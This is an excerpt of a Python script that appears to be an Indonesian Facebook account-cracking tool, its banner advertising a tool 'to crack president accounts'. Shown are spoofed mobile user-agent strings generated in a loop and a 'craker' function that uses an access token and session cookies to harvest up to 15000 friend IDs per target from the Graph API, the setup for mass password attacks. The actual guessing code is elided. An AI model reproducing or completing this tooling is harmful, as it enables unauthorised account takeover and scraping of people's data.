...
for xd in range(10000):
	...
	aa='Mozilla/5.0 (Linux; U; Android 8; en-US; Infinix X653C Build/PPR1.180610.011)'
	...
	l='Version/6.0 Linux/61.0.3163.128 Mobile Safari/537.36 XiaoMi/Mint Browser/3.9.3'
...
def banner():
	clear()
	wel = '# ALAT UNTUK MENGKREK AKUN PRESIDEN'
	wel7 = mark(wel, style='purple')
	sol().print(wel7)
	au='AUTHOR    :FAIZAL KHURAYRA'
	pengembang1=nel(au,style="purple")
	cetak(nel(pengembang1, title='INFORMASI GAK GUNA'))
...
def menu(my_name,my_id):
	...
	prints(Panel(f"{H2}",padding=(0,30),title=f"{N2}Select the script menu",subtitle=f"",style=f"{color_table}"))
...
def craker():
	...
	for userr in uid:
		try:
			col = ses.get('https://graph.facebook.com/v1.0/'+userr+'?fields=friends.limit(15000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
